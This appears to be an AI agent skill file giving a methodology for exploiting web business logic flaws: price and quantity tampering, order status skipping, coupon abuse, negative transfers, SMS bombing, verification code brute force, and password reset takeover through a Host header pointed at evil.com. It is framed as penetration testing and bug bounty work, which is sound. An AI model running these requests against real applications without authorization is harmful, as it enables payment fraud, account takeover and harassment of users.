---
name: business-logic-attack
description: "Web application business logic flaw detection and exploitation. Use when the target has commercial features such as payment/transaction/order/coupon/points/balance/top-up/transfer/cart. Use when account features such as user registration/login/SMS verification/email verification/password reset are found. Use when API requests expose business parameters such as price (price/amount), quantity (quantity/count), order number (order_id), promo code (coupon/promo). Business logic flaws need no technical vulnerability (SQLi/XSS); they exploit design flaws in the application flow — negative amounts, zero-cost payments, order status tampering, verification code reuse, race conditions. One of the most frequent vulnerability classes in bug bounty programs and real-world penetration tests; every application with transaction features should be checked"
zh-signals: "检测与利用 Web 业务逻辑漏洞，覆盖支付篡改、优惠券滥用、验证码与订单流程缺陷。信号:业务逻辑漏洞,支付篡改,0元购,验证码复用,并发竞争"
when-to-use: "Use when a web application has payment, transaction, order, coupon, points, balance, registration, SMS verification, or password reset features, or when requests expose business parameters such as price, quantity, order_id, or coupon."
metadata:
  tags: "business logic,payment,order,coupon,points,balance,broken access control,SMS bombing,verification code,logic flaw,zero-cost purchase,negative value,tampering"
  category: "exploit"
---

# Business Logic Flaw Methodology

The essence of a business logic flaw: the application fails to validate business rules server-side, letting an attacker violate the intended business flow by modifying request parameters. WAFs and automated scanners can barely detect these — every request still looks like a "normal" HTTP request.

## Phase 0: Attack Surface Identification

First read through the application features and find every operation involving a "state change" or "value transfer":

| Feature type | Focus | Typical flaw |
|----------|--------|----------|
| Payment / purchase | price/amount/total parameters | Amount tampering, zero-cost purchase, negative refund |
| Coupon / promotion | coupon/promo/discount | Reuse, enumeration, stacking |
| Points / balance | points/balance/credits | Negative top-up, concurrent spending |
| Order flow | order_id/status/step | State skipping, repeated operations |
| SMS / email verification | phone/email/code | Bombing, brute force, bypass |
| Password reset | token/code/user_id | Reset any user's password |
| User registration | role/type/is_admin | Role injection (→ privilege-escalation-web) |
| File / resource operations | file_id/doc_id | Broken access control (→ idor-methodology) |

## Phase 1: Payment and Transactions

### 1.1 Amount Tampering

Intercept the payment request and modify the price/amount/total parameters:

```
Original: POST /api/pay {"order_id":"123","amount":9999}
Test: POST /api/pay {"order_id":"123","amount":1}
Test: POST /api/pay {"order_id":"123","amount":0}
Test: POST /api/pay {"order_id":"123","amount":-1}
Test: POST /api/pay {"order_id":"123","amount":0.01}
```

Key checks:
- Does the server use the client-supplied amount, or look up the product price in the database?
- Does a negative amount cause a refund to the account balance?
- Decimal precision issues (can 0.001 pass validation?)

### 1.2 Quantity Tampering

```
Original: {"product_id":"A","quantity":1,"price":100}
Test: {"product_id":"A","quantity":0,"price":100}    → zero-cost purchase?
Test: {"product_id":"A","quantity":-1,"price":100}   → refund?
Test: {"product_id":"A","quantity":99999,"price":100} → overflow?
```

### 1.3 Order Status Tampering

```
Normal flow: pending payment(0) → paid(1) → shipped(2) → completed(3)
Attack: send status=1 directly to skip payment
Attack: send status=0 after completion to obtain the goods again
Attack: modify another user's order status
```

### 1.4 Payment Callback Forgery

Third-party payment (Alipay/WeChat/Stripe) callbacks are usually POSTed to the application's notify_url:
- Check whether the callback verifies the signature
- Whether the `total_amount` field can be modified
- Whether the callback request can be replayed (double credit)
- Whether a test-environment payment result can be replayed against production

## Phase 2: Coupons and Points

### 2.1 Coupon Abuse

```
# Reuse the same promo code multiple times
POST /api/coupon/apply {"code":"SAVE50"} → send repeatedly

# Promo code enumeration (if the format is predictable)
PROMO001, PROMO002, PROMO003...

# Stack multiple coupons
POST /api/coupon/apply {"codes":["SAVE50","WELCOME20"]}

# Negative discount
POST /api/coupon/apply {"discount":-100}
```

### 2.2 Points / Balance Operations

```
# Negative transfer
POST /api/transfer {"to":"victim","amount":-100}

# Concurrent top-up race → pair with race-condition-exploit
# Point redemption precision issue (is the rounding direction exploitable?)
```

## Phase 3: Verification Codes and Authentication

### 3.1 SMS Verification Codes

```
# SMS bombing: no rate limit on the same number
# Verification code brute force: exhaustive search over 4-6 digits
# Verification code reuse: the code is not invalidated after a successful check
# Verification code leak: the code is returned in the response
# Phone number parameter pollution:
POST /api/sms/send {"phone":["13800138000","attacker_phone"]}
```

### 3.2 Password Reset Flaws

```
# Reset any user's password — modify user_id/email
POST /api/reset {"token":"valid_token","user_id":"victim_id","password":"hacked"}

# Host header injection — the reset link points at the attacker's domain
POST /api/forgot  Host: evil.com  {"email":"victim@target.com"}
```

### 3.3 Login Logic

```
# Account lockout bypass — case/space/unicode variants
# Response difference enumeration — "username does not exist" vs "wrong password"
```

## Phase 4: Flow Skipping

### 4.1 Multi-Step Operation Skipping

```
Normal: Step1(fill in details) → Step2(verify) → Step3(submit)
Attack: request the Step3 API directly, skipping the verification step
```

### 4.2 Front-End Validation Bypass

All front-end validation can be bypassed by capturing the request — read-only price fields, disabled buttons, dropdown-restricted options.

## General Testing Checklist

```
✅ All price/amount parameters: change to 0, negative, very large values, decimals
✅ All quantity parameters: change to 0, negative, very large values
✅ All status parameters: try skipping, going back, repeating
✅ All ID parameters: replace with another user's/order's ID (→ IDOR skill)
✅ All verification codes: reuse, brute force, bomb
✅ All coupons: reuse, enumerate, stack
✅ All multi-step operations: skip intermediate steps
✅ Concurrent requests: balance spending, coupon use (→ race-condition skill)
```

## Further Reading

- Quick reference for business logic flaw patterns (payment/2FA/CAPTCHA/rate limiting/registration/password reset) → [references/logic-flaw-patterns.md](references/logic-flaw-patterns.md)
